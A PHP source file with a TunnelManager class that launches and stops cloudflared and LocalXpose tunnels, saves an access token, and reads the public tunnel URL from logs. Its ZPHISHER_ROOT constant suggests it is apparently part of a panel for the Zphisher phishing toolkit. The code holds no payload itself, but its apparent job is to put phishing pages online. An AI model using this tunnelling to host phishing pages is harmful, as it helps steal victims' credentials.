<?php
declare(strict_types=1);

final class TunnelManager
{
    public static function startCloudflared(string $host, int $port): array
    {
        self::stopCloudflared();
        $bin = BinaryInstaller::ensureCloudflared();
        if (!$bin['ok']) {
            return $bin;
        }
        @unlink(LOG_CLOUDFLARED);
        $path = $bin['path'];
        $cmd = escapeshellarg($path) . ' tunnel --url ' . escapeshellarg("$host:$port") . ' --logfile ' . escapeshellarg(LOG_CLOUDFLARED);
        ProcessHelper::startBackground($cmd, ZPHISHER_ROOT, LOG_CLOUDFLARED);
        sleep(8);
        $url = self::readCloudflaredUrl();
        if (!$url) {
            return ['ok' => false, 'error' => 'Cloudflared URL not found. Check network or try again.'];
        }
        return ['ok' => true, 'tunnel_url' => $url];
    }

    public static function startLoclx(string $host, int $port, string $region = 'us', ?string $token = null): array
    {
        if (ProcessHelper::isWindows()) {
            return ['ok' => false, 'error' => 'LocalXpose is supported on Linux/macOS only in this panel.'];
        }
        self::stopLoclx();
        $bin = BinaryInstaller::ensureLoclx();
        if (!$bin['ok']) {
            return $bin;
        }
        if ($token) {
            self::saveLoclxToken($token);
        } else {
            $token = self::getLoclxToken();
        }
        if (!$token) {
            return ['ok' => false, 'error' => 'LocalXpose token required. Save it in Settings.'];
        }

        $authDir = getenv('HOME') . DIRECTORY_SEPARATOR . '.localxpose';
        if (!is_dir($authDir)) {
            mkdir($authDir, 0700, true);
        }
        file_put_contents($authDir . DIRECTORY_SEPARATOR . '.access', $token);

        @unlink(LOG_LOCLX);
        $path = $bin['path'];
        $region = in_array($region, ['us', 'eu'], true) ? $region : 'us';
        $cmd = escapeshellarg($path) . ' tunnel --raw-mode http --region ' . $region
            . ' --https-redirect -t ' . escapeshellarg("$host:$port");
        ProcessHelper::startBackground($cmd, ZPHISHER_ROOT, LOG_LOCLX);
        sleep(12);
        $url = self::readLoclxUrl();
        if (!$url) {
            return ['ok' => false, 'error' => 'LocalXpose URL not found. Verify token and try again.'];
        }
        return ['ok' => true, 'tunnel_url' => 'https://' . $url];
    }

    public static function stopCloudflared(): void
    {
        $pid = ProcessHelper::readPid(PID_CLOUDFLARED);
        ProcessHelper::kill($pid);
        @unlink(PID_CLOUDFLARED);
        if (ProcessHelper::isWindows()) {
            ProcessHelper::killByName(['cloudflared.exe']);
        } else {
            ProcessHelper::killByName(['cloudflared']);
        }
    }

    public static function stopLoclx(): void
    {
        $pid = ProcessHelper::readPid(PID_LOCLX);
        ProcessHelper::kill($pid);
        @unlink(PID_LOCLX);
        ProcessHelper::killByName(['loclx']);
    }

    public static function readCloudflaredUrl(): ?string
    {
        if (!is_file(LOG_CLOUDFLARED)) {
            return null;
        }
        $log = (string) file_get_contents(LOG_CLOUDFLARED);
        if (preg_match('#https://[a-z0-9-]+\.trycloudflare\.com#i', $log, $m)) {
            return $m[0];
        }
        return null;
    }

    public static function readLoclxUrl(): ?string
    {
        if (!is_file(LOG_LOCLX)) {
            return null;
        }
        $log = (string) file_get_contents(LOG_LOCLX);
        if (preg_match('/[0-9a-zA-Z.-]+\.loclx\.io/', $log, $m)) {
            return $m[0];
        }
        return null;
    }

    private static function saveLoclxToken(string $token): void
    {
        Store::setSetting('loclx_token', trim($token));
    }

    public static function getLoclxToken(): ?string
    {
        return Store::getSetting('loclx_token');
    }
}
